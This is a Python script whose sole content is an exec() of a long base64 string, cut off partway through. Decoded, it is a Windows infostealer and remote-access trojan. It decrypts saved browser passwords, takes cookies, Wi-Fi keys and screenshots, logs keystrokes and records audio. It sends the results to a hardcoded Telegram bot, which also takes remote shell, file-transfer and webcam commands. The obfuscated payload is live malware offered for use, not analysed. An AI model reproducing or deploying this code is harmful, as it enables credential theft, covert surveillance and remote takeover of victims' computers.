import base64, os, sys
exec(base64.b64decode("CmltcG9ydCBvcwppbXBvcnQgc3FsaXRlMwppbXBvcnQgYmFzZTY0CmltcG9ydCBqc29uCmltcG9ydCBwbGF0Zm9ybQppbXBvcnQgcmVxdWVzdHMKaW1wb3J0IHRlbXBmaWxlCmltcG9ydCBzaHV0aWwKaW1wb3J0IHdpbnJlZwppbXBvcnQgc3VicHJvY2VzcwppbXBvcnQgc3lzCmltcG9ydCB0aHJlYWRpbmcKaW1wb3J0IHNvY2tldAppbXBvcnQgZ2V0cGFzcwppbXBvcnQgZGF0ZXRpbWUKaW1wb3J0IHRpbWUKZnJvbSB0aHJlYWRpbmcgaW1wb3J0IFRocmVhZAoKIyDQo9GB0YLQsNC90L7QstC60LAg0LfQsNCy0LjRgdC40LzQvtGB0YLQtdC5CmRlZiBpbnN0YWxsX2RlcHMoKToKICAgIHBhY2thZ2VzID0gWyJyZXF1ZXN0cyIsICJweWNyeXB0b2RvbWUiLCAiYnJvd3Nlci1jb29raWUzIiwgInB5d2luMzIiLCAicGlsbG93IiwgInB5bnB1dCIsICJweWF1ZGlvIiwgIm9wZW5jdi1weXRob24iLCAibnVtcHkiXQogICAgZm9yIHBhY2thZ2UgaW4gcGFja2FnZXM6CiAgICAgICAgdHJ5OgogICAgICAgICAgICBpZiBwYWNrYWdlID09ICJweXdpbjMyIjogX19pbXBvcnRfXygid2luMzJjcnlwdCIpCiAgICAgICAgICAgIGVsaWYgcGFja2FnZSA9PSAicGlsbG93IjogX19pbXBvcnRfXygiUElMIikKICAgICAgICAgICAgZWxpZiBwYWNrYWdlID09ICJicm93c2VyLWNvb2tpZTMiOiBfX2ltcG9ydF9fKCJicm93c2VyX2Nvb2tpZTMiKQogICAgICAgICAgICBlbGlmIHBhY2thZ2UgPT0gInB5bnB1dCI6IF9faW1wb3J0X18oInB5bnB1dCIpCiAgICAgICAgICAgIGVsaWYgcGFja2FnZSA9PSAicHlhdWRpbyI6IF9faW1wb3J0X18oInB5YXVkaW8iKQogICAgICAgICAgICBlbGlmIHBhY2thZ2UgPT0gIm9wZW5jdi1weXRob24iOiBfX2ltcG9ydF9fKCJjdjIiKQogICAgICAgICAgICBlbHNlOiBfX2ltcG9ydF9fKHBhY2thZ2UpCiAgICAgICAgZXhjZXB0OgogICAgICAgICAgICB0cnk6CiAgICAgICAgICAgICAgICBzdWJwcm9jZXNzLmNoZWNrX2NhbGwoW3N5cy5leGVjdXRhYmxlLCAiLW0iLCAicGlwIiwgImluc3RhbGwiLCBwYWNrYWdlLCAiLS11c2VyIiwgIi0tcXVpZXQiXSwgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHN0ZG91dD1zdWJwcm9jZXNzLkRFVk5VTEwsIHN0ZGVycj1zdWJwcm9jZXNzLkRFVk5VTEwpCiAgICAgICAgICAgIGV4Y2VwdDogcGFzcwoKaW5zdGFsbF9kZXBzKCkKCiMg0JjQvNC/0L7RgNGC0Ysg0L/QvtGB0LvQtSDRg9GB0YLQsNC90L7QstC60LgKZnJvbSBDcnlwdG8uQ2lwaGVyIGltcG9ydCBBRVMKZnJvbSBDcnlwdG8uVXRpbC5QYWRkaW5nIGltcG9ydCB1bnBhZAppbXBvcnQgd2luMzJjcnlwdAppbXBvcnQgYnJvd3Nlcl9jb29raWUzCmZyb20gUElMIGltcG9ydCBJbWFnZUdyYWIKZnJvbSBweW5wdXQgaW1wb3J0IGtleWJvYXJkCmltcG9ydCBweWF1ZGlvCmltcG9ydCB3YXZlCmltcG9ydCBjdjIKaW1wb3J0IG51bXB5IGFzIG5wCgpURUxFR1JBTV9CT1RfVE9LRU4gPSAiODI0MTgwMDk1MTpBQUZMMVpDZHJ1WG5QZy0wWTA5cGxBcGhHSEVXTHR3QmNtNCIKVEVMRUdSQU1fQ0hBVF9JRCA9ICI3NzQ1OTI1Njg2IgoKY2xhc3MgS2V5TG9nZ2VyOgogICAgZGVmIF9faW5pdF9fKHNlbGYpOiBzZWxmLmxvZyA9ICIiOyBzZWxmLmxpc3RlbmVyID0gTm9uZQogICAgZGVmIG9uX3ByZXNzKHNlbGYsIGtleSk6CiAgICAgICAgdHJ5OgogICAgICAgICAgICBpZiBoYXNhdHRyKGtleSwgJ2NoYXInKSBhbmQga2V5LmNoYXI6IHNlbGYubG9nICs9IGtleS5jaGFyCiAgICAgICAgICAgIGVsaWYga2V5ID09IGtleWJvYXJkLktleS5zcGFjZTogc2VsZi5sb2cgKz0gIiAiCiAgICAgICAgICAgIGVsaWYga2V5ID09IGtleWJvYXJkLktleS5lbnRlcjogc2VsZi5sb2cgKz0gIlxuIgogICAgICAgICAgICBlbGlmIGtleSA9PSBrZXlib2FyZC5LZXkuYmFja3NwYWNlOiBzZWxmLmxvZyA9IHNlbGYubG9nWzotMV0KICAgICAgICAgICAgZWxzZTogc2VsZi5sb2cgKz0gZiIgW3trZXl9XSAiCiAgICAgICAgICAgIGlmIGxlbihzZWxmLmxvZykgPiAxMDA6IHNlbGYuc2F2ZV9sb2coKQogICAgICAgIGV4Y2VwdDogcGFzcwogICAgZGVmIHNhdmVfbG9nKHNlbGYpOgogICAgICAgIHRyeToKICAgICAgICAgICAgd2l0aCBvcGVuKG9zLnBhdGguam9pbih0ZW1wZmlsZS5nZXR0ZW1wZGlyKCksICJrZXlsb2cudHh0IiksICJhIiwgZW5jb2Rpbmc9InV0Zi04IikgYXMgZjoKICAgICAgICAgICAgICAgIGYud3JpdGUoc2VsZi5sb2cpOyBzZWxmLmxvZyA9ICIiCiAgICAgICAgZXhjZXB0OiBwYXNzCiAgICBkZWYgc3RhcnQoc2VsZik6CiAgICAgICAgdHJ5OiBzZWxmLmxpc3RlbmVyID0ga2V5Ym9hcmQuTGlzdGVuZXIob25fcHJlc3M9c2VsZi5vbl9wcmVzcyk7IHNlbGYubGlzdGVuZXIuc3RhcnQoKTsgcmV0dXJuIFRydWUKICAgICAgICBleGNlcHQ6IHJldHVybiBGYWxzZQogICAgZGVmIHN0b3Aoc2VsZik6CiAgICAgICAgaWYgc2VsZi5saXN0ZW5lcjogc2VsZi5saXN0ZW5lci5zdG9wKCkKICAgICAgICBzZWxmLnNhdmVfbG9nKCkKCmNsYXNzIEF1ZGlvUmVjb3JkZXI6CiAgICBkZWYgX19pbml0X18oc2VsZik6IHNlbGYucmVjb3JkaW5nID0gRmFsc2U7IHNlbGYuZnJhbWVzID0gW10KICAgIGRlZiByZWNvcmRfYXVkaW8oc2VsZik6CiAgICAgICAgdHJ5OgogICAgICAgICAgICBwID0gcHlhdWRpby5QeUF1ZGlvKCkKICAgICAgICAgICAgc3RyZWFtID0gcC5vcGVuKGZvcm1hdD1weWF1ZGlvLnBhSW50MTYsIGNoYW5uZWxzPTIsIHJhdGU9NDQxMDAsIGlucHV0PVRydWUsIGZyYW1lc19wZXJfYnVmZmVyPTEwMjQpCiAgICAgICAgICAgIHNlbGYuZnJhbWVzID0gW107IHNlbGYucmVjb3JkaW5nID0gVHJ1ZQogICAgICAgICAgICB3aGlsZSBzZWxmLnJlY29yZGluZzogc2VsZi5mcmFtZXMuYXBwZW5kKHN0cmVhbS5yZWFkKDEwMjQpKQogICAgICAgICAgICBzdHJlYW0uc3RvcF9zdHJlYW0oKTsgc3RyZWFtLmNsb3NlKCk7IHAudGVybWluYXRlKCk7IHNlbGYuc2F2ZV9yZWNvcmRpbmcoKQogICAgICAgIGV4Y2VwdDogcGFzcwogICAgZGVmIHNhdmVfcmVjb3JkaW5nKHNlbGYpOgogICAgICAgIHRyeToKICAgICAgICAgICAgd2YgPSB3YXZlLm9wZW4ob3MucGF0aC5qb2luKHRlbXBmaWxlLmdldHRlbXBkaXIoKSwgImF1ZGlvX3JlY29yZC53YXYiKSwgJ3diJykKICAgICAgICAgICAgd2Yuc2V0bmNoYW5uZWxzKDIpOyB3Zi5zZXRzYW1wd2lkdGgoMik7IHdmLnNldGZyYW1lcmF0ZSg0NDEwMCkKICAgICAgICAgICAgd2Yud3JpdGVmcmFtZXMoYicnLmpvaW4oc2VsZi5mcmFtZXMpKTsgd2YuY2xvc2UoKQogICAgICAgIGV4Y2VwdDogcGFzcwogICAgZGVmIHN0YXJ0KHNlbGYpOgogICAgICAgIHNlbGYucmVjb3JkaW5nID0gVHJ1ZQogICAgICAgIHNlbGYucmVjb3JkX3RocmVhZCA9IFRocmVhZCh0YXJnZXQ9c2VsZi5yZWNvcmRfYXVkaW8pCiAgICAgICAgc2VsZi5yZWNvcmRfdGhyZWFkLmRhZW1vbiA9IFRydWU7IHNlbGYucmVjb3JkX3RocmVhZC5zdGFydCgpCiAgICBkZWYgc3RvcChzZWxmKTogc2VsZi5yZWNvcmRpbmcgPSBGYWxzZQoKY2xhc3MgQWR2YW5jZWRTdGVhbGVyOgogICAgZGVmIF9faW5pdF9fKHNlbGYpOgogICAgICAgIHNlbGYuZGF0YSA9IHsicGFzc3dvcmRzIjogW10sICJjb29raWVzIjogW10sICJzY3JlZW5zaG90cyI6IFtdLCAic3lzdGVtX2luZm8iOiB7fSwgIndpZmlfcGFzc3dvcmRzIjogW119CiAgICAKICAgIGRlZiBnZXRfbWFzdGVyX2tleShzZWxmLCBicm93c2VyX3BhdGgpOgogICAgICAgIHRyeToKICAgICAgICAgICAgd2l0aCBvcGVuKG9zLnBhdGguam9pbihicm93c2VyX3BhdGgsICJMb2NhbCBTdGF0ZSIpLCAncicsIGVuY29kaW5nPSd1dGYtOCcpIGFzIGY6CiAgICAgICAgICAgICAgICBsb2NhbF9zdGF0ZSA9IGpzb24ubG9hZChmKQogICAgICAgICAgICBtYXN0ZXJfa2V5ID0gYmFzZTY0LmI2NGRlY29kZShsb2NhbF9zdGF0ZVsib3NfY3J5cHQiXVsiZW5jcnlwdGVkX2tleSJdKVs1Ol0KICAgICAgICAgICAgcmV0dXJuIHdpbjMyY3J5cHQuQ3J5cHRVbnByb3RlY3REYXRhKG1hc3Rlcl9rZXksIE5vbmUsIE5vbmUsIE5vbmUsIDApWzFdCiAgICAgICAgZXhjZXB0OiByZXR1cm4gTm9uZQoKICAgIGRlZiBkZWNyeXB0X3Bhc3N3b3JkKHNlbGYsIGJ1ZmYsIG1hc3Rlcl9rZXkpOgogICAgICAgIHRyeToKICAgICAgICAgICAgaXYgPSBidWZmWzM6MTVdOyBwYXlsb2FkID0gYnVmZlsxNTpdCiAgICAgICAgICAgIGNpcGhlciA9IEFFUy5uZXcobWFzdGVyX2tleSwgQUVTLk1PREVfR0NNLCBpdikKICAgICAgICAgICAgcmV0dXJuIGNpcGhlci5kZWNyeXB0KHBheWxvYWQpWzotMTZdLmRlY29kZSgpCiAgICAgICAgZXhjZXB0OgogICAgICAgICAgICB0cnk6IHJldHVybiBzdHIod2luMzJjcnlwdC5DcnlwdFVucHJvdGVjdERhdGEoYnVmZiwgTm9uZSwgTm9uZSwgTm9uZSwgMClbMV0pCiAgICAgICAgICAgIGV4Y2VwdDogcmV0dXJuICIiCgogICAgZGVmIHN0ZWFsX2Jyb3dzZXJfcGFzc3dvcmRzKHNlbGYpOgogICAgICAgIGJyb3dzZXJzID0gewogICAgICAgICAgICAiQ2hyb21lIjogb3MucGF0aC5qb2luKG9zLmVudmlyb25bJ1VTRVJQUk9GSUxFJ10sICJBcHBEYXRhIiwgIkxvY2FsIiwgIkdvb2dsZSIsICJDaHJvbWUiLCAiVXNlciBEYXRhIiksCiAgICAgICAgICAgICJPcGVyYSI6IG9zLnBhdGguam9pbihvcy5lbnZpcm9uWydVU0VSUFJPRklMRSddLCAiQXBwRGF0YSIsICJSb2FtaW5nIiwgIk9wZXJhIFNvZnR3YXJlIiwgIk9wZXJhIFN0YWJsZSIpLAogICAgICAgICAgICAiT3BlcmEgR1giOiBvcy5wYXRoLmpvaW4ob3MuZW52aXJvblsnVVNFUlBST0ZJTEUnXSwgIkFwcERhdGEiLCAiUm9hbWluZyIsICJPcGVyYSBTb2Z0d2FyZSIsICJPcGVyYSBHWCBTdGFibGUiKSwKICAgICAgICAgICAgIkVkZ2UiOiBvcy5wYXRoLmpvaW4ob3MuZW52aXJvblsnVVNFUlBST0ZJTEUnXSwgIkFwcERhdGEiLCAiTG9jYWwiLCAiTWljcm9zb2Z0IiwgIkVkZ2UiLCAiVXNlciBEYXRhIiksCiAgICAgICAgICAgICJCcmF2ZSI6IG9zLnBhdGguam9pbihvcy5lbnZpcm9uWydVU0VSUFJPRklMRSddLCAiQXBwRGF0YSIsICJMb2NhbCIsICJCcmF2ZVNvZnR3YXJlIiwgIkJyYXZlLUJyb3dzZXIiLCAiVXNlciBEYXRhIiksCiAgICAgICAgICAgICJZYW5kZXgiOiBvcy5wYXRoLmpvaW4ob3MuZW52aXJvblsnVVNFUlBST0ZJTEUnXSwgIkFwcERhdGEiLCAiTG9jYWwiLCAiWWFuZGV4IiwgIllhbmRleEJyb3dzZXIiLCAiVXNlciBEYXRhIiksCiAgICAgICAgICAgICJWaXZhbGRpIjogb3MucGF0aC5qb2luKG9zLmVudmlyb25bJ1VTRVJQUk9GSUxFJ10sICJBcHBEYXRhIiwgIkxvY2FsIiwgIlZpdmFsZGkiLCAiVXNlciBEYXRhIikKICAgICAgICB9CiAgICAgICAgZm9yIGJyb3dzZXJfbmFtZSwgYnJvd3Nlcl9wYXRoIGluIGJyb3dzZXJzLml0ZW1zKCk6CiAgICAgICAgICAgIHRyeToKICAgICAgICAgICAgICAgIGlmIG9zLnBhdGguZXhpc3RzKGJyb3dzZXJfcGF0aCk6IHNlbGYuc3RlYWxfY2hyb21lX2Jhc2VkX3Bhc3N3b3Jkcyhicm93c2VyX3BhdGgsIGJyb3dzZXJfbmFtZSkKICAgICAgICAgICAgZXhjZXB0OiBjb250aW51ZQoKICAgIGRlZiBzdGVhbF9jaHJvbWVfYmFzZWRfcGFzc3dvcmRzKHNlbGYsIGJyb3dzZXJfcGF0aCwgYnJvd3Nlcl9uYW1lKToKICAgICAgICB0cnk6CiAgICAgICAgICAgIG1hc3Rlcl9rZXkgPSBzZWxmLmdldF9tYXN0ZXJfa2V5KGJyb3dzZXJfcGF0aCkKICAgICAgICAgICAgaWYgbm90IG1hc3Rlcl9rZXk6IHJldHVybgogICAgICAgICAgICBsb2dpbl9kYXRhX3BhdGggPSBvcy5wYXRoLmpvaW4oYnJvd3Nlcl9wYXRoLCAiRGVmYXVsdCIsICJMb2dpbiBEYXRhIikKICAgICAgICAgICAgaWYgbm90IG9zLnBhdGguZXhpc3RzKGxvZ2luX2RhdGFfcGF0aCk6IHJldHVybgogICAgICAgICAgICB0ZW1wX2RiID0gb3MucGF0aC5qb2luKHRlbXBmaWxlLmdldHRlbXBkaXIoKSwgInRlbXBfbG9naW4uZGIiKQogICAgICAgICAgICBzaHV0aWwuY29weTIobG9naW5fZGF0YV9wYXRoLCB0ZW1wX2RiKQogICAgICAgICAgICBjb25uID0gc3FsaXRlMy5jb25uZWN0KHRlbXBfZGIpCiAgICAgICAgICAgIGN1cnNvciA9IGNvbm4uY3Vyc29yKCkKICAgICAgICAgICAgY3Vyc29yLmV4ZWN1dGUoIlNFTEVDVCBvcmlnaW5fdXJsLCB1c2VybmFtZV92YWx1ZSwgcGFzc3dvcmRfdmFsdWUgRlJPTSBsb2dpbnMiKQogICAgICAgICAgICBmb3Igcm93IGluIGN1cnNvci5mZXRjaGFsbCgpOgogICAgICAgICAgICAgICAgdXJsLCB1c2VybmFtZSwgZW5jcnlwdGVkX3Bhc3N3b3JkID0gcm93CiAgICAgICAgICAgICAgICBpZiB1cmwgYW5kIHVzZXJuYW1lIGFuZCBlbmNyeXB0ZWRfcGFzc3dvcmQ6CiAgICAgICAgICAgICAgICAgICAgZGVjcnlwdGVkX3Bhc3N3b3JkID0gc2VsZi5kZWNyeXB0X3Bhc3N3b3JkKGVuY3J5cHRlZF9wYXNzd29yZCwgbWFzdGVyX2tleSkKICAgICAgICAgICAgICAgICAgICBpZiBkZWNyeXB0ZWRfcGFzc3dvcmQ6CiAgICAgICAgICAgICAgICAgICAgICAgIHNlbGYuZGF0YVsicGFzc3dvcmRzIl0uYXBwZW5kKHsKICAgICAgICAgICAgICAgICAgICAgICAgICAgICJicm93c2VyIjogYnJvd3Nlcl9uYW1lLCAidXJsIjogdXJsLCAidXNlcm5hbWUiOiB1c2VybmFtZSwgInBhc3N3b3JkIjogZGVjcnlwdGVkX3Bhc3N3b3JkCiAgICAgICAgICAgICAgICAgICAgICAgIH0pCiAgICAgICAgICAgIGNvbm4uY2xvc2UoKTsgb3MucmVtb3ZlKHRlbXBfZGIpCiAgICAgICAgZXhjZXB0OiBwYXNzCgogICAgZGVmIHN0ZWFsX2Nvb2tpZXMoc2VsZik6CiAgICAgICAgdHJ5OgogICAgICAgICAgICBmb3IgYnJvd3Nlcl9uYW1lIGluIFsnY2hyb21lJywgJ29wZXJhJywgJ2VkZ2UnLCAnYnJhdmUnLCAndml2YWxkaSddOgogICAgICAgICAgICAgICAgdHJ5OgogICAgICAgICAgICAgICAgICAgIGNqID0gZ2V0YXR0cihicm93c2VyX2Nvb2tpZTMsIGJyb3dzZXJfbmFtZSkoKQogICAgICAgICAgICAgICAgICAgIGZvciBjb29raWUgaW4gY2o6CiAgICAgICAgICAgICAgICAgICAgICAgIHNlbGYuZGF0YVsiY29va2llcyJdLmFwcGVuZCh7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAiYnJvd3NlciI6IGJyb3dzZXJfbmFtZSwgImRvbWFpbiI6IGNvb2tpZS5kb21haW4sICJuYW1lIjogY29va2llLm5hbWUsICJ2YWx1ZSI6IGNvb2tpZS52YWx1ZQogICAgICAgICAgICAgICAgICAgICAgICB9KQogICAgICAgICAgICAgICAgZXhjZXB0OiBjb250aW51ZQogICAgICAgIGV4Y2VwdDogcGFzcwoKICAgIGRlZiB0YWtlX3NjcmVlbnNob3Qoc2VsZik6CiAgICAgICAgdHJ5OgogICAgICAgICAgICBzY3JlZW5zaG90ID0gSW1hZ2VHcmFiLmdyYWIoKQogICAgICAgICAgICBzY3JlZW5zaG90X3BhdGggPSBvcy5wYXRoLmpvaW4odGVtcGZpbGUuZ2V0dGVtcGRpcigpLCAic2NyZWVuc2hvdC5wbmciKQogICAgICAgICAgICBzY3JlZW5zaG90LnNhdmUoc2NyZWVuc2hvdF9wYXRoKQogICAgICAgICAgICB3aXRoIG9wZW4oc2NyZWVuc2hvdF9wYXRoLCAicmIiKSBhcyBmOgogICAgICAgICAgICAgICAgc2VsZi5kYXRhWyJzY3JlZW5zaG90cyJdLmFwcGVuZChiYXNlNjQuYjY0ZW5jb2RlKGYucmVhZCgpKS5kZWNvZGUoKSkKICAgICAgICAgICAgb3MucmVtb3ZlKHNjcmVlbnNob3RfcGF0aCkKICAgICAgICBleGNlcHQ6IHBhc3MKCiAgICBkZWYgZ2V0X3dpZmlfcGFzc3dvcmRzKHNlbGYpOgogICAgICAgIHRyeToKICAgICAgICAgICAgaWYgcGxhdGZvcm0uc3lzdGVtKCkgPT0gIldpbmRvd3MiOgogICAgICAgICAgICAgICAgcmVzdWx0cyA9IHN1YnByb2Nlc3MuY2hlY2tfb3V0cHV0KFsnbmV0c2gnLCAnd2xhbicsICdzaG93JywgJ3Byb2ZpbGVzJ10sIHNoZWxsPVRydWUpLmRlY29kZSgnY3A4NjYnKS5zcGxpdCgnXG4nKQogICAgICAgICAgICAgICAgcHJvZmlsZXMgPSBbaS5zcGxpdCgiOiIpWzFdWzE6LTFdIGZvciBpIGluIHJlc3VsdHMgaWYgItCS0YHQtSDQv9GA0L7RhNC40LvQuCDQv9C+0LvRjNC30L7QstCw0YLQtdC70LXQuSIgaW4gaV0KICAgICAgICAgICAgICAgIGZvciBwcm9maWxlIGluIHByb2ZpbGVzOgogICAgICAgICAgICAgICAgICAgIHRyeToKICAgICAgICAgICAgICAgICAgICAgICAgcmVzdWx0cyA9IHN1YnByb2Nlc3MuY2hlY2tfb3V0cHV0KFsnbmV0c2gnLCAnd2xhbicsICdzaG93JywgJ3Byb2ZpbGUnLCBwcm9maWxlLCAna2V5PWNsZWFyJ10sIHNoZWxsPVRydWUpLmRlY29kZSgnY3A4NjYnKS5zcGxpdCgnXG4nKQogICAgICAgICAgICAgICAgICAgICAgICBwYXNzd29yZCA9IFtiLnNwbGl0KCI6IilbMV1bMTotMV0gZm9yIGIgaW4gcmVzdWx0cyBpZiAi0KHQvtC00LXRgNC20LjQvNC+0LUg0LrQu9GO0YfQsCIgaW4gYl0KICAgICAgICAgICAgICAgICAgICAgICAgaWYgcGFzc3dvcmQ6IHNlbGYuZGF0YVsid2lmaV9wYXNzd29yZHMiXS5hcHBlbmQoeyJzc2lkIjogcHJvZmlsZSwgInBhc3N3b3JkIjogcGFzc3dvcmRbMF19KQogICAgICAgICAgICAgICAgICAgIGV4Y2VwdDogY29udGludWUKICAgICAgICBleGNlcHQ6IHBhc3MKCiAgICBkZWYgZ2V0X3N5c3RlbV9pbmZvKHNlbGYpOgogICAgICAgIHRyeToKICAgICAgICAgICAgc2VsZi5kYXRhWyJzeXN0ZW1faW5mbyJdID0gewogICAgICAgICAgICAgICAgInVzZXJuYW1lIjogZ2V0cGFzcy5nZXR1c2VyKCksICJjb21wdXRlcl9uYW1lIjogcGxhdGZvcm0ubm9kZSgpLAogICAgICAgICAgICAgICAgIm9zIjogcGxhdGZvcm0uc3lzdGVtKCkgKyAiICIgKyBwbGF0Zm9ybS5yZWxlYXNlKCksICJwcm9jZXNzb3IiOiBwbGF0Zm9ybS5wcm9jZXNzb3IoKSwKICAgICAgICAgICAgICAgICJhcmNoaXRlY3R1cmUiOiBwbGF0Zm9ybS5hcmNoaXRlY3R1cmUoKVswXSwgInRpbWVzdGFtcCI6IHN0cihkYXRldGltZS5kYXRldGltZS5ub3coKSkKICAgICAgICAgICAgfQogICAgICAgIGV4Y2VwdDogcGFzcwoKICAgIGRlZiBzZW5kX3RvX3RlbGVncmFtKHNlbGYpOgogICAgICAgIHRyeToKICAgICAgICAgICAgbWVzc2FnZSA9IGYi8J+UjSAq0KHQotCY0JvQm9CV0KAg0JDQmtCi0JjQktCY0KDQntCS0JDQnSpcblxuKtCh0LjRgdGC0LXQvNCwOioge3NlbGYuZGF0YVsnc3lzdGVtX2luZm8nXS5nZXQoJ3VzZXJuYW1lJywgJ04vQScpfUB7c2VsZi5kYXRhWydzeXN0ZW1faW5mbyddLmdldCgnY29tcHV0ZXJfbmFtZScsICdOL0EnKX1cbirQn9Cw0YDQvtC70Lg6KiB7bGVuKHNlbGYuZGF0YVsncGFzc3dvcmRzJ10pfVxuKkNvb2tpZXM6KiB7bGVuKHNlbGYuZGF0YVsnY29va2llcyddKX1cbipXaS1GaToqIHtsZW4oc2VsZi5kYXRhWyd3aWZpX3Bhc3N3b3JkcyddKX1cblxu8J+kliDQkdC+0YIg0LPQvtGC0L7QsiDQuiDRg9C/0YDQsNCy0LvQtdC90LjRjiEiCiAgICAgICAgICAgIHJlcXVlc3RzLnBvc3QoZiJodHRwczovL2FwaS50ZWxlZ3JhbS5vcmcvYm90e1RFTEVHUkFNX0JPVF9UT0tFTn0vc2VuZE1lc3NhZ2UiLCBkYXRhPXsiY2hhdF9pZCI6IFRFTEVHUkFNX0NIQVRfSUQsICJ0ZXh0IjogbWVzc2FnZSwgInBhcnNlX21vZGUiOiAiTWFya2Rvd24ifSkKICAgICAgICAgICAgaWYgc2VsZi5kYXRhWyJwYXNzd29yZHMiXToKICAgICAgICAgICAgICAgIHBhc3N3b3Jkc190ZXh0ID0gIirwn5SRINCd0LDQudC00LXQvdC90YvQtSDQv9Cw0YDQvtC70Lg6KlxuIgogICAgICAgICAgICAgICAgZm9yIHB3ZCBpbiBzZWxmLmRhdGFbInBhc3N3b3JkcyJdWzoxMF06CiAgICAgICAgICAgICAgICAgICAgcGFzc3dvcmRzX3RleHQgKz0gZiLwn4yQIHtwd2RbJ2Jyb3dzZXInXX06IHtwd2RbJ3VybCddfVxu8J+RpCB7cHdkWyd1c2VybmFtZSddfVxu8J+UkCB7cHdkWydwYXNzd29yZCddfVxuXG4iCiAgICAgICAgICAgICAgICByZXF1ZXN0cy5wb3N0KGYiaHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdHtURUxFR1JBTV9CT1RfVE9LRU59L3NlbmRNZXNzYWdlIiwgZGF0YT17ImNoYXRfaWQiOiBURUxFR1JBTV9DSEFUX0lELCAidGV4dCI6IHBhc3N3b3Jkc190ZXh0Wzo0MDAwXSwgInBhcnNlX21vZGUiOiAiTWFya2Rvd24ifSkKICAgICAgICAgICAgaWYgc2VsZi5kYXRhWyJzY3JlZW5zaG90cyJdOgogICAgICAgICAgICAgICAgcmVxdWVzdHMucG9zdChmImh0dHBzOi8vYXBpLnRlbGVncmFtLm9yZy9ib3R7VEVMRUdSQU1fQk9UX1RPS0VOfS9zZW5kUGhvdG8iLCBkYXRhPXsiY2hhdF9pZCI6IFRFTEVHUkFNX0NIQVRfSUR9LCBmaWxlcz17InBob3RvIjogKCJzY3JlZW5zaG90LnBuZyIsIGJhc2U2NC5iNjRkZWNvZGUoc2VsZi5kYXRhWyJzY3JlZW5zaG90cyJdWzBdKSl9KQogICAgICAgIGV4Y2VwdDogcGFzcwoKICAgIGRlZiBydW4oc2VsZik6CiAgICAgICAgc2VsZi5nZXRfc3lzdGVtX2luZm8oKTsgc2VsZi5zdGVhbF9icm93c2VyX3Bhc3N3b3JkcygpOyBzZWxmLnN0ZWFsX2Nvb2tpZXMoKQogICAgICAgIHNlbGYuZ2V0X3dpZmlfcGFzc3dvcmRzKCk7IHNlbGYudGFrZV9zY3JlZW5zaG90KCk7IHNlbGYuc2VuZF90b190ZWxlZ3JhbSgpCgpjbGFzcyBUZWxlZ3JhbUNvbnRyb2xsZXI6CiAgICBkZWYgX19pbml0X18oc2VsZik6CiAgICAgICAgc2VsZi5sYXN0X3VwZGF0ZV9pZCA9IDA7IHNlbGYua2V5bG9nZ2VyID0gS2V5TG9nZ2VyKCk7IHNlbGYuYXVkaW9fcmVjb3JkZXIgPSBBdWRpb1JlY29yZGVyKCkKICAgICAgICBzZWxmLmNvbW1hbmRzX2hhbmRsZXJzID0gewogICAgICAgICAgICAnc3RlYWxfcGFzc3dvcmRzJzogc2VsZi5zdGVhbF9wYXNzd29yZHNfY29tbWFuZCwgJ3NjcmVlbnNob3QnOiBzZWxmLnNjcmVlbnNob3RfY29tbWFuZCwKICAgICAgICAgICAgJ3dlYmNhbSc6IHNlbGYud2ViY2FtX2NvbW1hbmQsICdrZXlsb2dnZXJfc3RhcnQnOiBzZWxmLmtleWxvZ2dlcl9zdGFydF9jb21tYW5kLAogICAgICAgICAgICAna2V5bG9nZ2VyX3N0b3AnOiBzZWxmLmtleWxvZ2dlcl9zdG9wX2NvbW1hbmQsICdrZXlsb2dnZXJfZ2V0Jzogc2VsZi5rZXlsb2dnZXJfZ2V0X2NvbW1hbmQsCiAgICAgICAgICAgICdzeXN0ZW1faW5mbyc6IHNlbGYuc3lzdGVtX2luZm9fY29tbWFuZCwgJ3dpZmlfcGFzc3dvcmRzJzogc2VsZi53aWZpX3Bhc3N3b3Jkc19jb21tYW5kLAogICAgICAgICAgICAnc2hlbGwnOiBzZWxmLnNoZWxsX2NvbW1hbmQsICdkb3dubG9hZF9maWxlJzogc2VsZi5kb3dubG9hZF9maWxlX2NvbW1hbmQsCiAgICAgICAgICAgICd1cGxvYWRfZmlsZSc6IHNlbGYudXBsb2FkX2ZpbGVfY29tbWFuZCwgJ3Byb2Nlc3NfbGlzdCc6IHNlbGYucHJvY2Vzc19saXN0X2NvbW1hbmQsCiAgICAgICAgICAgICdraWxsX3Byb2Nlc3MnOiBzZWxmLmtpbGxfcHJvY2Vzc19jb21tYW5kLCAnc2h1dGRvd24nOiBzZWxmLnNodXRkb3duX2NvbW1hbmQsCiAgICAgICAgICAgICdyZXN0YXJ0Jzogc2VsZi5yZXN0YXJ0X2NvbW1hbmQsICdsb2NrX3NjcmVlbic6IHNlbGYubG9ja19zY3JlZW5fY29tbWFuZCwKICAgICAgICAgICAgJ2F1ZGlvX3N0YXJ0Jzogc2VsZi5hdWRpb19zdGFydF9jb21tYW5kLCAnYXVkaW9fc3RvcCc6IHNlbGYuYXVkaW9fc3RvcF9jb21tYW5kLAogICAgICAgICAgICAnYXVkaW9fZ2V0Jzogc2VsZi5hdWRpb19nZXRfY29tbWFuZCwgJ2Z1bGxfc2Nhbic6IHNlbGYuZnVsbF9zY2FuX2NvbW1hbmQKICAgICAgICB9CiAgICAKICAgIGRlZiBzZW5kX21lc3NhZ2Uoc2VsZiwgdGV4dCwgcmVwbHlfbWFya3VwPU5vbmUpOgogICAgICAgIHRyeToKICAgICAgICAgICAgZGF0YSA9IHsiY2hhdF9pZCI6IFRFTEVHUkFNX0NIQVRfSUQsICJ0ZXh0IjogdGV4dCwgInBhcnNlX21vZGUiOiAiTWFya2Rvd24ifQogICAgICAgICAgICBpZiByZXBseV9tYXJrdXA6IGRhdGFbInJlcGx5X21hcmt1cCJdID0ganNvbi5kdW1wcyhyZXBseV9tYXJrdXApCiAgICAgICAgICAgIHJlcXVlc3RzLnBvc3QoZiJodHRwczovL2FwaS50ZWxlZ3JhbS5vcmcvYm90e1RFTEVHUkFNX0JPVF9UT0tFTn0vc2VuZE1lc3NhZ2UiLCBkYXRhPWRhdGEpCiAgICAgICAgZXhjZXB0OiBwYXNzCgogICAgZGVmIHNlbmRfcGhvdG8oc2VsZiwgcGhvdG9fZGF0YSwgY2FwdGlvbj0iIik6CiAgICAgICAgdHJ5OgogICAgICAgICAgICByZXF1ZXN0cy5wb3N0KGYiaHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdHtURUxFR1JBTV9CT1RfVE9LRU59L3NlbmRQaG9